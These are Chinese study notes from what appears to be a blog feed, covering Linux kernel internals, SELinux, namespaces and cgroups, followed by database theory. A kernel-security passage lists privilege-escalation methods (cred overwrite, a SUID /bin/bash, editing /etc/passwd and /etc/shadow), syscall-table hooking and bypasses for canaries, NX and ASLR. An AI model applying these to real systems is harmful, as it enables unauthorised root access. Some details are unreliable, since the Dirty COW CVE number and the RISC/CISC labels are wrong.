进程调度：/kernel+/arch<br>生命周期、优先级、共享CPU、多处理器下的负载均衡</p></li><li><p>进程间通信：/ipc<br>管道、共享内存、消息队列、套接字、信号</p></li><li><p>虚拟文件系统VFS：/fs<br>为Ext文件系统提供一个通用的抽象接口</p></li><li><p>网络堆栈：/net<br>在TCP上有个Socket层，是网络子系统的标准API，为各种网络协议提供接口</p></li><li><p>设备驱动程序：/drivers<br>支持特定设备的运转</p></li><li><p>体系架构：/arch</p></li><li><p>系统调用接口SCI：/kernel+/arch，内核提供的来让用户态转为内核态</p><blockquote><p><a href="https://blog.csdn.net/sinat_26227857/article/details/44244433">系统调用表</a></p></blockquote></li></ul><p>关键数据结构</p><ul><li>Task_struct（进程结构）：<code>/include/linux/sched.h</code></li><li>Linux_binprm（二进制代码装入）：<code>/include/linux/binfmts.h</code></li><li>Super_block（超级块）：<code>/include/linux/fs.h</code></li><li>Inode（索引节点）：<code>/include/linux/fs.h</code></li><li>File（文件）：<code>/include/linux/fs.h</code></li><li>Dentry（目录项）：<code>/include/linux/dcache.h</code></li><li>SK_buff（套接字缓冲区）：<code>/include/linux/skbuff.h</code></li><li>Net_device（网络设备）：<code>/include/linux/netdevice.h</code></li><li>Kern_ipc_perm（ipc的消息队列）：<code>/include/linux/ipc.h</code></li></ul><h3 id="内存管理"><a href="#内存管理" class="headerlink" title="内存管理"></a>内存管理</h3><p>目标：地址独立、地址保护</p><p>管理内容：内存初始化、页表的管理、页面分配器、小块内存分配器、vmalloc机制、虚拟内存管理、缺页中断、页面回收</p><p>内存初始化：</p><ul><li>内核启动页表<code>arch/x86/kernel/head.s</code></li><li>内存初始化<code>init/main.c</code>的<code>static void __init mm_init(void)</code></li><li>对于32位linux采用2级页表，64位则采用4级页表</li></ul><p>物理内存空间管理：</p><ul><li><p>数据结构：设置了一个mem_map[]数组管理内存页面page，其在系统初始化时由free_area_init()函数创建。数组元素是page结构体，每个page结构体对应一个物理页面。</p><blockquote><p>page定义在<code>/include/linux/mm_types.h</code>；mem_map[]定义在<code>mm/page_alloc.c</code></p></blockquote></li><li><p>Buddy/伙伴算法：对空闲空间管理，mm/page_alloc.c中实现 </p></li><li>Slab算法：面向对象管理，适合于小块内存的申请，减少了内部碎片</li></ul><p>虚拟地址空间管理：</p><ul><li>进程虚拟空间分为内核区和用户区</li><li>/include/linux/mm_types.h中<code>mm_struct</code>定义了每个进程的虚存用户区</li><li>/include/linux/mm.h定义的<code>vm_area_struct</code>为上述虚存用户区的中单独的虚拟区域结构</li><li>/mm/mmap.c中的<code>do_mmap()</code>完成执行映像向虚存区域的映射，建立有关的虚存区域</li></ul><p>请页机制：相关处理函数<code>do_page_fault()</code></p><ul><li>缺页异常：malloc/mmap首次申请、代码段首次映射地址空间、内存不足发生页交换、栈不够、访问非法地址</li><li><p>没有访问权限：copy on write、程序错误被杀</p></li><li><p>发生过程：</p><ol><li>在内存中有空闲物理页面时，分配一物理页帧，转第5步；</li><li>依据页面置换算法选择将被替换的物理页帧F，对应逻辑页Q；</li><li>如Q被修改过，则把它写回外存；</li><li>修改Q的页表项中驻留位置为0；</li><li>将需要访问的页P装入到物理页面F；</li><li>修改p的页表项驻留位为1，物理页帧号为f；</li><li>重新执行产生缺页的指令</li></ol></li></ul><p>交换机制：通过将磁盘上一部分空间作为交换空间，当物理内存不足时，将一部分暂不用的数据换入到交换空间中，来解决内存不足的问题。守护进程<code>kswapd()</code></p><p>缓冲机制：采用页面高速缓存（加快对磁盘文件的访问）、缓冲区高速缓存（针对I/O）、交换区缓存</p><p>常用内存分配函数:</p><div class="table-container"><table><thead><tr><th>函数名</th><th>分配原理</th><th>最大内存</th><th>其他</th></tr></thead><tbody><tr><td><code>_get_free_pages()</code></td><td>直接对页框进行操作</td><td>4MB</td><td>适用于分配较大量的连续物理内存</td></tr><tr><td><code>kmem_cache_alloc()</code></td><td>基于slab机制实现</td><td>128KB</td><td>适合需要频繁申请释放相同大小内存块时使用</td></tr><tr><td><code>kmalloc()</code></td><td>基于kmem_cache_alloc实现</td><td>128KB</td><td>最常见的分配方式，需要小于页框大小的内存时使用</td></tr><tr><td><code>vmalloc()</code></td><td>建立非连续物理内存到虚拟地址的映射</td><td></td><td>物理不连续，适合需要大内存，但对地址连续性没有要求的场合</td></tr><tr><td><code>alloc_bootmem()</code></td><td>在启动kernel时，预留一段内存，内核看不见</td><td></td><td>小于物理内存大小，内存管理要求较高</td></tr><tr><td><code>Ioremap()</code></td><td>实现已知物理地址到虚拟地址的映射</td><td></td><td>适用于物理地址已知的场合，如设备驱动</td></tr><tr><td><code>dma_alloc_coherent</code></td><td>基于_alloc_pages实现</td><td>4MB</td><td>适用于DMA操作</td></tr></tbody></table></div><h3 id="进程管理"><a href="#进程管理" class="headerlink" title="进程管理"></a>进程管理</h3><p>进程=执行的程序，由程序段+相关数据段+PCB（进程控制块）组成实体/进程映像。具有如下特性：动态性（有生命周期）、并发性（可多个实体同存）、独立性（独立运行）、异步性（各自推进）</p><p>进程初始化过程：</p><ol><li>创建进程控制块，并将其加入到进程表中；</li><li>分配该进程所需资源；</li><li>设置进程初始状态，如运行态、等待态等；</li><li>加载到内存中，进行重定位给操作；</li><li>为程序设置栈空间，将参数、环境变量等数据拷贝到栈中；</li><li>启动开始函数；</li></ol><p>进程创建过程如下：</p><p><img src="https://s2.loli.net/2024/08/08/dOhI1EHlvS26T8u.png" alt="fork.png"></p><ul><li>vfork函数：父进程会一直阻塞，直到子进程调用exit()或者exec()为止；且父子共享地址空间，如果子进程修改了某个变量，这将影响到父进程</li><li>clone函数：不仅可以创建进程或者线程，还可以指定创建新的命名空间、有选择的继承父进程的内存、甚至可以将创建出来的进程变成父进程的兄弟进程等等</li><li>do_fork函数（/kernel/fork.c）,copy_process函数（主要用于创建子进程的描述符与相关数据结构）</li><li>内核级线程创建API<code>kthread_create</code>、<code>kthreat_run</code>最终也是调用do_fork实现</li></ul><p><strong>0号进程</strong>/idle进程/swapper进程：Linux内核初始化阶段从无到有创建的一个内核线程，在/include/linux/init_task.h，所有进程的父进程</p><p><strong>1号进程</strong>/init进程：由idle通过kernel_thread创建，在内核空间完成初始化函数start_kernel后, 加载init程序，完成系统的初始化</p><p><strong>2号进程</strong>/kthreadd进程：由idle通过kernel_thread创建，并始终运行在内核空间, 负责所有内核线程的调度和管理</p><p>进程状态：创建态、就绪态、执行态、阻塞态、终止态；</p><p>进程终止：</p><ul><li>主动：main函数返回，链接程序自动添加exit()；主动调用exit()</li><li>被动：收到一个不能处理的信号、产生了异常、收到SIGKILL等终止信号</li><li>exit()系统调用把退出码转换成内核要求的格式并且调用do_exit()函数来处理</li></ul><p>进程调度：调度策略大致分为非实时和实时调度策略</p><ul><li>非实时：SCHED_NORMAL（使用CFS调度器来调度运行）、SCHED_BATCH（CFS调度器。采用分时策略，根据动态优先级分配）、SCHED_IDLE（CFS调度器。适用于优先级较低的后台任务）</li><li><p>实时：SCHED_FIFO（先进先出）、SCHED_RR（时间片轮转，可抢占）</p></li><li><p>实现于/kernel/sched.c</p></li><li>优先级：初始优先级即nice值，-20到19默认0，越小越高；动态优先级prio值以nice为基数经过effective_prio()函数返回，同样实现于上述文件</li></ul><p>CFS/完全公平调度算法：每个进程运行一段时间、循环轮转，选择运行虚拟时间最少的进程为下一个运行进程。维护一个以vruntime为索引的红黑树，始终选择树中最左侧叶子节点。实现于/kernel/sched/fair.c</p><blockquote><p> 时间记账vruntime=实际运行时间*nice为0的权重值/当前进程的权重值（权重越大vruntime增加的越慢）；权重值有对应表查找</p></blockquote><p><strong>锁机制</strong>：</p><ul><li><p>原子操作atomic_t：确保指令执行期间不被打断，要么全部执行完，要么根本不执行</p></li><li><p>自旋锁spinlock_t（中断处理过程）：防止多于一个的执行线程同时进入临界区</p></li><li><p>信号量/睡眠锁semaphore：一个任务试图获得一个已经被占用的信号量时，信号量会将其推进一个等待队列，然后让其睡眠</p></li><li><p>互斥体mutex：同上，但计数通常为1而非数量</p></li><li><p>读写锁rwlock_t：允许多个线程并发地读访问临界区，但是写访问只限制于一个线程</p></li></ul><p>内存屏障：防止处理器或编译器对指令执行和内存修改进行重新排序；</p><blockquote><p>load屏障：在该屏障后的都要缓冲区内运行完后才可以执行<br>store屏障：强制所有在store屏障指令之前的store指令，都在该store屏障指令执行之前被执行，并把store缓冲区的数据都刷到CPU缓存<br>full屏障：保障了早于屏障的内存读写操作的结果提交到内存之后，再执行晚于屏障的读写操作</p></blockquote><p>内存屏障接口函数：</p><div class="table-container"><table><thead><tr><th>函数</th><th>功能</th></tr></thead><tbody><tr><td>barrier</td><td>阻止编译器跨越屏障对载入或存储操作进行优化</td></tr><tr><td>rmb</td><td>阻止跨越屏障的载入动作发生重排序</td></tr><tr><td>read_barrier_depends</td><td>阻止跨越屏障的具有数据依赖关系的载入动作重排序</td></tr><tr><td>wmb</td><td>阻止跨越屏障的存储动作发生重排序</td></tr><tr><td>mb</td><td>阻止跨越屏障的载入和存储动作重新排序</td></tr><tr><td>smp_rmb</td><td>在SMP上提供rmb()功能，在UP上提供barrier()功能</td></tr><tr><td>smp_read_barrier_depends</td><td>在SMP上提供read_barrier_depends()功能，在UP上提供barrier()功能</td></tr><tr><td>smp_wmb</td><td>在SMP上提供wmb()功能，在UP上提供barrier()功能</td></tr></tbody></table></div><p><strong>沙箱机制</strong>：隔离环境</p><p>SELinux（LSM安全模块）中</p><ul><li><p>自主访问控制DAC：对象（一般指文件等）的属主全权管理该对象的访问控制策略，有权读取、修改、转移对象信息，并且可以把这种权限转移给其他主体</p></li><li><p>强制访问控制MAC：每一个主体（包括用户和程序）和客体都拥有固定的安全标记，主体能否对客体进行相关操作，取决于主体和客体所拥有安全标记的关系</p></li></ul><blockquote><p>SELinux三种工作模式：强制（违反阻止并记录）,容忍（违反不阻但记录）,关闭</p></blockquote><p>Chroot：更改根目录，但常用于进行逃逸</p><p>Seccomp-BPF：白名单设置系统调用，并使用Berkeley Packet Filter规则实现，可以对任意系统调用及其参数进行过滤</p><p>命名空间：mount、uts、ipc、pid、network、user等类似设置</p><p>LibOS：库操作系统，根据某类应用的特殊需求，由某一高级编程语言将原本属于操作系统内核的某些资源管理功能按照模块化的要求，以库形式提供给应用程序的特殊操作系统。与应用程序在编译时被链接到一起，形成一个只有<strong>单地址空间</strong>的二进制文件并<strong>工作在应用层</strong></p><h3 id="IO设备与驱动"><a href="#IO设备与驱动" class="headerlink" title="IO设备与驱动"></a>IO设备与驱动</h3><p>Linux上的驱动包括：字符设备（字节为单位的I/O传输，键鼠等）、块设备（磁盘等）、网络设备。<code>ls -al /dev</code>查看目录下的设备文件，该目录是动态生成的、使用devtmpfs虚拟文件系统挂载的、基于RAM的虚拟文件系统，打开设备就相当于打开这些文件。</p><p>为管理设备，Linux给设备都编的有设备号，包含主副，主的用来区分不同种类，副的区分不同设备。在/include/linux/fs.h中有相关设备号分配的函数，<code>alloc_chrdev_region()</code>自动分配、<code>register_chrdev_region()</code>需要主动指定</p><p><strong>字符设备</strong>：include/linux/cdev.h中的cdev数据结构</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cdev</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kobject</span> <span class="title">kobj</span>;</span><span class="comment">//设备驱动对象</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">module</span> *<span class="title">owner</span>;</span><span class="comment">//驱动程序对应的内核模块的指针</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> *<span class="title">ops</span>;</span><span class="comment">//操作函数</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span><span class="comment">//将字符设备串为链表</span></span><br><span class="line">    <span class="type">dev_t</span> dev;<span class="comment">//设备号</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> count;<span class="comment">//次设备号个数</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>块设备驱动</strong>：一般一块512B，有缓存，通常由文件系统调用；对应用层来说通常有如下两种访问方式；/dev和文件系统挂载点，前者和字符设备一样，通常用于配置，后者在mount之后就可以通过文件系统直接访问一个块设备</p><p><img src="https://s2.loli.net/2024/08/08/BqSFH36ATZQrDL2.png" alt="mount.png"></p><p>I/O操作类型：同步阻塞I/O（发起后等待返回）、同步非阻塞I/O（一直发直到返回）、异步阻塞I/O、异步非阻塞I/O、多路复用（多线程）</p><p><strong>Linux驱动</strong>：模块可以扩充内核功能，驱动程序也算是一种模块。<code>insmod</code>将模块加入正在运行的内核，<code>rmmod</code>将其从内核删除；在内核启动时装载叫静态装载，运行时叫动态装载。</p><p>在开发驱动时：不能访问C库，只能访问有限的系统调用或者使用汇编，此外还需要注意同步与并发。<code>module_init()</code>驱动代码的入口点，每当加载该模块时就会被调用，<code>module_exit()</code>当驱动在内核被卸载时自动调用</p><ul><li>/proc文件系统：仅存在于内存，其下的文件都绑定于一个内核函数，也可以进行修改</li><li>/sys文件系统：除了上面的功能外，还能够统一管理设备模型（使用了kobject对象，它使得所有设备在底层具有统一的接口，包括设备、驱动、总线等）</li></ul><h3 id="Linux内核漏洞"><a href="#Linux内核漏洞" class="headerlink" title="Linux内核漏洞"></a>Linux内核漏洞</h3><p>用户态漏洞是指用户态程序漏洞，通常包括应用程序的漏洞，以及操作系统用户态模块的漏洞。<br>内核漏洞是指运行在RING0的程序所具有的能被利用的Bug或缺陷。</p><blockquote><p>运行在Ring0上的操作系统内核、驱动共享同一个虚拟地址空间，可以完全访问系统空间的内存。而不像用户态进程那样拥有独立私有的内存空间</p></blockquote><ul><li>内存破坏漏洞：栈溢出、堆溢出（溢出、内存泄漏）</li><li>未初始化的/未验证/已损坏的指针引用：空指针引用<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-2692">CVE - CVE-2009-2692 (mitre.org)</a>、空指针间接引用本地拒绝服务漏洞<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-2627">CVE - CVE-2014-2627 (mitre.org)</a></li><li>整数溢出：Linux内核中的TCP协议栈整数溢出<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-11477">CVE - CVE-2019-11477 (mitre.org)</a></li><li>竞态条件：脏牛漏洞，内存子系统在处理copy-on-write（COW）时出现竞争条件，导致私有只读存储器映射被破坏，可利用此漏洞非法获得读写权限，进而提升权限<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-5159">CVE - CVE-2016-5159 (mitre.org)</a></li><li>基于Cache的侧信道攻击：利用 CPU cache 访问速度和主存访问速度间的巨大时间差异进行侧信道分析</li><li>Hook：修改系统调用函数表<a href="https://elixir.bootlin.com/linux/v3.19.2/source/arch/x86/syscalls/syscall_32.tbl">sys_call_table</a>；先去掉该表的写保护，劫持system_call并获取上表地址，找到需要的函数进行替换</li></ul><p>缓冲区溢出防护机制：</p><ul><li><p>Canary-金丝雀：将随机产生的canary(探测值)插入到返回地址和局部变量之间，在函数返回之前检查canary，如果检测到错误的canary则证明溢出</p><p>gcc编译选项<code>-fstack-protector</code>仅对局部变量中含有char数组的函数插入，<code>-fstack-protector-all</code>所有函数启用，<code>-fno-stack-protector</code>禁用堆栈保护</p><p>绕过：猜数、获取该值并在shellcode中写入、攻击检查函数、更改存储的canary值</p></li><li><p>NX（DEP）：将数据所在内存页(默认的堆页、栈页以及内存池页）标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。对应操作系统中的NX/XD属性，指明该内存不能执行代码</p><p><code>gcc -z execstack -o test test.c</code>关闭NX保护，默认开启</p><p>绕过：关闭DEP、ROP、ret2lib</p></li><li><p>ASLR地址随机化：共享库、栈、mmap、堆、内核地址空间、VDSO的随机化；</p><p>绕过：伪随机、堆喷射定位内存、ROP链、GOT表劫持</p></li></ul><p>提权技术：</p><ol><li>修改cred结构提权</li><li>利用系统权限检查缺陷，为/bin/bash设置S位，再使用设置了S位的/bin/bash打开shell，从而获取root权限。（<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-8660">CVE - CVE-2015-8660 (mitre.org)</a>）</li><li>利用漏洞对任意文件写数据（脏牛）</li><li>直接修改/etc/passwd中用户的uid和gid为0</li><li>直接修改/etc/shadow文件中root用户的密码</li></ol><p>内核漏洞防御机制：检查输入输出、安全验证和过滤、安全编码、驱动白名单、CFI-控制流完整性（限制程序运行中的控制流转移，使其始终处于原有的控制流图所限定的范围内）、VSM-虚拟安全模式（微型操作系统运行LSA服务）、SMEP-监督模式执行保护（禁止内核CPU访问用户空间）、KPTI-内核页表隔离（完全分离用户空间与内核空间页表）</p><h3 id="SELinux"><a href="#SELinux" class="headerlink" title="SELinux"></a>SELinux</h3><p><a href="https://www.redhat.com/zh/topics/linux/what-is-selinux">SELinux</a>是一种基于域-类型模型的强制访问控制MAC安全系统，它定义了每个人对系统上的应用、进程和文件的访问控制。</p><ul><li><p>过程：当程序发出访问对象的请求时，SELinux会检查访问向量缓存表AVC，其中缓存有主体和对象的访问权限，如果SELinux无法做出决定，那么该请求将被发送到安全服务器进行检查匹配。</p></li><li><p>区别：而传统Linux与Unix采用DAC（自主访问控制），即对象拥有者可以任意修改或授予此对象相应的rwx权限。相比于此，SeLinux对于用户和进程只赋予最小权限，并防止了权限的升级（这些策略由管理员定制，一般用户无法更改）</p></li></ul><div class="table-container"><table><thead><tr><th>SElinux命令</th><th>作用</th></tr></thead><tbody><tr><td>getenforce</td><td>查看SELinux状态</td></tr><tr><td>setenforce 1/0</td><td>设置状态1为强制，0为宽容模式</td></tr><tr><td>seinfo/sestatus</td><td>查看SE大致信息/详细信息</td></tr><tr><td>semodule</td><td>模块管理</td></tr><tr><td>chcon</td><td>更改文件目录设备的安全上下文</td></tr><tr><td>restorecon</td><td>恢复安全上下文</td></tr><tr><td>sesearch</td><td>查看系统详细策略信息-allow语句</td></tr></tbody></table></div><blockquote><p>状态：Enforcing-1（验证并限制）、Permissive-0（验证但不限制仅警告）、Disable（关闭SElinux，需要修改配置文件/boot/grub/grub.conf-优先读取或/etc/selinux/config）<code>SELINUX=enforcing</code>：当前SELinux的状态；<code>SELINUXTYPE=targeted</code>：当前SELinux的策略</p></blockquote><p>Selinux的<a href="https://zhuanlan.zhihu.com/p/584479924">MAC</a>由三个相对独立的子模型构成：TE（类型强制）、MCS（多类别模型）、MLS（多层级模型）</p><ul><li>TE：A和B进程类型只能访问给定对象类型，即分类</li><li>MCS：类别标记后的对应访问</li><li>MLS：主体和对象均有安全层级</li></ul><p>LSM框架：其允许安全模块插入内核中，用于提高传统DAC安全性。当用户进程经过DAC检查后，会由LSM Hook与SElinux的相关模块进行检查</p><p><img src="https://s2.loli.net/2024/08/08/yliHUouNIZ4dGVD.png" alt="LSM.png"></p><h3 id="Namespace及Cgroups机制"><a href="#Namespace及Cgroups机制" class="headerlink" title="Namespace及Cgroups机制"></a>Namespace及Cgroups机制</h3><p>两者在Linux用于隔离进程，前者负责信息隔离，后者负责进程资源大小限制。</p><ul><li>UTS NameSpace：提供了主机名和域名的隔离，使得每个容器就拥有了独立的主机名和域名，在网络上可以被视作一个独立的节点</li><li>PID Namespace：两个不同命名空间下的进程可以有同一个PID</li><li>Mount NameSpace：使得不同空间下的文件操作互不影响；fs/mount.h中的mnt_namespace结构体</li><li>IPC NameSpace：进程间通信如信号量、消息队列、共享内存的隔离</li><li>Network namespace：网络资源如设备、协议栈、路由表等的隔离</li><li>User namespace：隔离了安全相关的标识符和属性</li></ul><p>Cgroups：若干控制组组成树状结构，子节点继承父结点属性，而每一层中有若干子系统，每一个子系统控制该层级的不同资源</p><p>子系统：cpu（限制进程cpu使用率）、cpuacct（统计cpu使用报告）、cpuset（用于分配cpu节点或内存结点）、memory（限制内存使用）、blkio（限制进程对块设备的操作）…</p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> OS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据库与云</title>
      <link href="/2023/09/01/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%90%86%E8%AE%BA/"/>
      <url>/2023/09/01/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%90%86%E8%AE%BA/</url>
      
        <content type="html"><![CDATA[<h3 id="什么是服务器"><a href="#什么是服务器" class="headerlink" title="什么是服务器"></a>什么是服务器</h3><h4 id="服务器介绍"><a href="#服务器介绍" class="headerlink" title="服务器介绍"></a>服务器介绍</h4><p>与平时的计算机类似，但是相对比较专业化，具有更强大的计算处理能力，其硬件也相对更好；目前市面术语介绍：</p><ul><li>服务器：24小时全端口开放的电脑，有公网IP，一般不要GUI，通过ssh发送命令。操作系统相较于普通桌面较为不同，常用滴有Unix、Linux、Windows server、Netware</li><li>物理服务器-独立服务器：存在于身边摸得着的，与之对应的是云服务器。</li><li>裸金属：完全属于自己的服务器，但是在云上</li><li>VDS：虚拟专用服务器，全虚拟化，比VPS更加接近独服，虚拟硬件</li><li><p>VPS/小鸡：虚拟私人服务器，使用虚拟化技术或容器技术，仅虚拟软件，相当于租一个没装修的房子，宿主叫母鸡；可装OS（阿里ECS、腾讯CVM、百度BCC同理）</p></li><li><p>NAT VPS/NAT鸡：介于虚拟主机和VPS之间，能使用端口有范围，共享IP；</p></li><li>虚拟主机：共享主机，虚拟主机就是合租，但已经配置好了；性能不好</li><li>存储型服务器：专用于备份，类似于NAS，相当于在虚拟主机的基础上将功能进行阉割，与轻量应用服务器类似</li></ul><h4 id="服务器分类"><a href="#服务器分类" class="headerlink" title="服务器分类"></a>服务器分类</h4><p>根据在服务器上的软件，我们可以分为应用服务器、数据库（DB）服务器、web/网页服务器、邮件服务器等；下面是其他的分类</p><div class="table-container"><table><thead><tr><th>体系结构分类</th><th>规模/应用层次分类</th><th>结构分类</th><th>用途分类</th></tr></thead><tbody><tr><td>x86服务器(RISC)</td><td>入门级</td><td>塔式服务器</td><td>通用型</td></tr><tr><td>非x86服务器(CISC)</td><td>工作组级</td><td>机架式服务器</td><td>专用型</td></tr><tr><td></td><td>部门级</td><td>刀片式服务器</td><td></td></tr><tr><td></td><td>企业级</td><td>机柜式服务器</td></tr></tbody></table></div><p><strong>Web服务器</strong>：</p><p>即在网络环境下，为客户提供服务的专用计算机，也叫做www服务器（网页浏览器的交流对象）;与应用服务器没有非常大的区别，本来web服务器是一种应用服务器，仅仅处理的是网页的静态内容，但随着服务器端脚本的发展，使得web服务器也同样能够像应用服务器一样处理动态内容；主流的web服务器（装的软件）有：Apache、IIS、Nginx、Zeus（Unix系统下）、Tomcat</p><p><strong>DB服务器</strong>：</p><p>在某台服务器上安装了提供数据库服务的软件（即数据库管理系统），使该台服务器专用于数据处理等任务；数据库按照支持的模型可以分为关系型数据库RDBMS（大多使用或兼容SQL语言、但注意关系型数据库并不是SQL）、非关系型数据库NRDBMS（NoSQL语言，NotOnlySQL）</p><p>关系型数据库：将复杂数据变化为二元表格的形式；</p><div class="table-container"><table><thead><tr><th>MySQL</th><th>SQL server</th><th>Oracle</th><th>PostgreSQL</th></tr></thead><tbody><tr><td>开源、简单、小；字符客户端mysql</td><td>微软、可免费；图形化客户端ADS</td><td>顶级；字符客户端sqlplus</td><td>开源；字符客户端pesql</td></tr><tr><td>数据量大时不太行</td><td>windows专属</td><td>收费</td></tr></tbody></table></div><p>非关系型数据库：</p><ul><li>键值型数据库：类似于py的字典，具有将数据化为键与值（可有多个）的形式；常见的有Redis</li><li>列存储数据库：与关系型数据库类似，仅仅是存储形式的差异，前者以行为单位存储，后置以列为单位；常见的有Hbase</li><li>文档型数据库：存放并获取文档，与键值DB类似，将文件作为值；MongDB等；集合collection=表table、文档document=行row、字段field=列column</li><li>图形数据库：在处理复杂图形关系时，相比于关系型数据库容易；Neo4J等</li><li>搜索引擎数据库：搜索引擎会爬取大量的内容，需要以特定的形式存储；Solr等</li></ul><h3 id="数据库理论"><a href="#数据库理论" class="headerlink" title="数据库理论"></a>数据库理论</h3><h4 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h4><p>许多<strong>数据</strong>（data）构成<strong>数据库</strong>（database），组织数据的存储与管理的叫<strong>数据库管理系统</strong>（DataBaseManagementSystem）,由以上说明的东西构成的整个体系叫做<strong>数据库系统</strong>，当然该系统也包括<strong>数据管理员</strong>（DBAdministrator）与用户在内。</p><p>发展阶段：人工管理—文件系统—数据库系统。</p><blockquote><p> 用户通过SQL（StructureQueryLanguage，非过程语言）与数据库管理系统进行交互，非过程即不需要在乎更底层的具体实现；SQL包括四类，数据<strong>查询</strong>语言<em>DQL</em>、数据<strong>操纵</strong>语言<em>DML</em>、数据<strong>定义</strong>语言<em>DDL</em>、数据<strong>控制</strong>语言<em>DCL</em>；</p></blockquote><div class="table-container"><table><thead><tr><th>人工管理</th><th>文件系统</th><th>数据库系统</th></tr></thead><tbody><tr><td>不保存数据</td><td>可以长期保存</td><td>结构化</td></tr><tr><td>没有相应软件</td><td>有专门软件</td><td>数据由DBMS统一管理</td></tr><tr><td>不共享</td><td>共享性差</td><td>共享性好，冗余度低</td></tr><tr><td>数据之间不独立</td><td>独立性差</td><td>高度物理独立性，一定逻辑独立性</td></tr></tbody></table></div><h4 id="DataBase"><a href="#DataBase" class="headerlink" title="DataBase"></a>DataBase</h4><p><strong>数据模型</strong>=数据结构+数据操作+数据约束条件；</p><p>大体包括两类：概念模型（用户角度）和数据模型（计算机角度；层次模型、网状模型、关系模型）</p><div class="table-container"><table><thead><tr><th>类型</th><th>数据结构</th><th>查询效率</th><th>数据独立性</th><th>DML操作方式</th></tr></thead><tbody><tr><td>层次、网状</td><td>链表</td><td>低</td><td>差</td><td>过程性</td></tr><tr><td>关系</td><td>二维表</td><td>高</td><td>高</td><td>非过程性</td></tr></tbody></table></div><ul><li><p><strong>层次模型</strong>：基本结构：树，一个根节点，每个节点一个父节点，一对多联系；借助冗余结点法（互相指）OR虚拟节点法（都指向一个共同虚拟节点）可以实现多对多联系；存储结构有邻接法（数组）AND链接法（链表）；</p></li><li><p><strong>网状模型</strong>：基本结构：可以没有父节点，类似于图；存储结构常用链接法，此外有指针阵列法、二进制阵列、索引法；</p></li><li><p><strong>关系模型</strong>：基本结构：二维表，关系模式+关系+元组+属性+主码+域+分量。关系就是这张表、元组即一行、属性即一列、属性中的序号即为主码，用来确定一行、域即是一列的所有可能取值集合、分量是一个元组中的属性值；</p></li></ul><h4 id="数据库系统结构"><a href="#数据库系统结构" class="headerlink" title="数据库系统结构"></a>数据库系统结构</h4><p>从DBMS看为三级模式结构，由<strong>外模式</strong>（也叫子模式/用户模式，用户看到的）+<strong>模式</strong>（相同的数据在交给不同应用之前都是相同）+<strong>内模式</strong>（也叫存储模式，即数据在DB中的表示形式）构成，在三层中间插入二层映像：<strong>”外模式/模式映像“</strong>和<strong>“模式/内模式映像”</strong>；</p><p>从最终用户角度看，包括单用户结构、主从式结构、分布式结构、客户-服务器结构、云结构；</p><h4 id="DBMS"><a href="#DBMS" class="headerlink" title="DBMS"></a>DBMS</h4><ul><li><strong>主要功能</strong>：数据定义+数据操纵+数据库运行管理+数据组织、存储、管理+数据库的建立和维护+数据通信接口；数据控制功能：数据安全性+数据完整性+并发控制+恢复</li><li><strong>构成</strong>：数据定义语言及其翻译处理程序+数据操纵语言及其编译/解释程序+数据库运行控制程序+实用程序；</li><li><strong>工作过程</strong>：应用A向DBMS发送请求—》DBMS进行检查—》调用外模式，确定A需要的数据—》调用内模式，定位以及确定格式—》向操作系统发送请求—》OS将数据从存储区调到缓冲区—》DBMS导出A所需格式，并发送给A，以及return状态；</li></ul><h4 id="关系模型"><a href="#关系模型" class="headerlink" title="关系模型"></a>关系模型</h4><p>关系模型=关系数据结构（二维表）+关系操作+完整性约束</p><ol><li><p><strong>关系数据结构</strong></p><ul><li><p>关系:表格中除了第一行之外的所有元素；是域的笛卡尔积的子集；</p><p>关系的6条性质：</p><ul><li><p>列是同质的，即来自同一个域；不同列可来自同一个域，但每列的属性名不同；顺序无所谓；</p></li><li><p>任意两个元组不能完全相同；顺序无所谓；</p></li><li><p>每个分量都是原子值，不能进一步拆分；</p></li></ul></li><li><p>关系模式:表的名字；</p><ul><li>形式化:R(U，D，DOM，F)</li><li>U为组成关系R的属性名集合，D:组成U的属性的域，DOM:属性-域的映像（即二元关系中的函数）<br>元组:一行。其个数叫“基数”；</li></ul></li><li><p>域domain:对应属性下的所有可能取值；具有相同数据类型；</p></li><li><p>属性:一列。个数叫“关系的度/目”；</p></li><li><p>候选码:能唯一确定一个元组的属性码；选定的其中一个叫“主码/主键”，其中的属性不能为空值；如果所有的属性组均是候选码，则叫做“全码”；</p></li><li><p>分量:交叉点；</p></li></ul></li><li><p><strong>关系的完整性</strong></p><p>完整性就是约束；包括实体完整性（必）、参照完整性（必）、用户定义的完整性；</p><ul><li><p>实体完整性规则：属性A是基本关系R的主属性，则属性A不能为空值；</p></li><li><p>参照完整性规则：属性组F是基本关系R的外码，F中的分量取值要么为空值，要么等于关系S中的主码值</p><blockquote><p>两张表之间，R的外码是引用另一张表S的属性，S叫‘’被参照关系‘’，R叫“参照关系”</p></blockquote></li></ul></li><li><p><strong>关系操作</strong></p><p>关系操作=查询+修改，两部分；CRUD-增删改查；其中的查询操作有基于关系运算的查询&amp;基于谓词的查询；查询语言即关系语言因此分为：关系代数